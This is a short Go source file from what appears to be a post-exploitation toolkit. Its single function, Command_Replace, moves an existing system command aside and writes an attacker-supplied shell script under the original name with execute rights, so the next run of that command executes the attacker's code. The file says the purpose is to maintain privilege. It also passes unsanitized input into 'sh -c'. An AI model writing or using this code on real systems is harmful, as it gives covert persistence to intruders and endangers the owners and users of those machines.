package maintance

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func Command_Replace(oldcommand_dir_newbash string) {
	fmt.Println("use the command replace to maintance the privilege")
	oldcommanddirnewbash := strings.Split(oldcommand_dir_newbash, "#")
	oldcommand := oldcommanddirnewbash[0]
	dir := oldcommanddirnewbash[1]
	newbash := oldcommanddirnewbash[2]
	cmd1 := exec.Command("mv", fmt.Sprintf(oldcommand), fmt.Sprintf(dir))
	err := cmd1.Run()
	if err != nil {
		fmt.Println("Error move the old command", err)
		os.Exit(1)
	}
	cmd2 := exec.Command("sh", "-c", fmt.Sprintf("echo '%s' > %s && chmod +x %s", newbash, oldcommand, oldcommand))
	err = cmd2.Run()
	if err != nil {
		fmt.Println("Error change the old command to the new bash command", err)
		os.Exit(1)
	}
	fmt.Println(fmt.Sprintf("replace the oldcommand %s with the newbash %s and put the oldcommand in the directory of %s", oldcommand, newbash, dir))
	fmt.Println("success")
}
